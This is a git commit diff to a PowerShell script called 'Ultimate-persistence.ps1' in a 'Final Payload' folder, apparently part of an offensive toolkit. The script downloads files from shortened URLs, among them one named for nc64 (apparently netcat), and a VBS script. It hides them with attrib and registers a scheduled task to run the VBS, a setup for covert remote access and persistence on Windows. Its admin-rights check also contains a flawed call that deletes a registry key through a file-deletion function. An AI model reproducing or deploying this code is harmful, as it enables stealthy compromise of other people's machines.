a0e1df7bc978926c3a37725dfab3e3845cb6edc0
AKSHAT Singh <84120105+ShorterKing@users.noreply.github.com>
2024-08-08 22:30:22 +0530

    Update Ultimate-persistence.ps1

--- Final Payload/Ultimate-persistence.ps1
+++ Final Payload/Ultimate-persistence.ps1
@@ -1,5 +1,19 @@
-# Check if running with administrative rights
-$adminRights = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+# Check if the current user has administrative privileges
+function Test-AdminRights {
+    try {
+        # Try to create a registry key in HKLM
+        $key = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey("TestAdminRights")
+        if ($key) {
+            $key.Close()
+            [System.IO.File]::Delete($key.Name)
+            return $true
+        }
+    } catch {
+        return $false
+    }
+}
+
+$adminRights = Test-AdminRights
 
 if ($adminRights) {
     # Admin rights detected
@@ -40,6 +54,11 @@ $nc64TxtUrl = "https://rb.gy/guty9"
 Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath
 Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath
 Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath
+
+# Make the downloaded files hidden
+attrib +H $quietTxtPath
+attrib +H $nc64TxtPath
+attrib +H $scriptVbsPath
 
 # Create a scheduled task
 $action = New-ScheduledTaskAction -Execute $scriptVbsPath
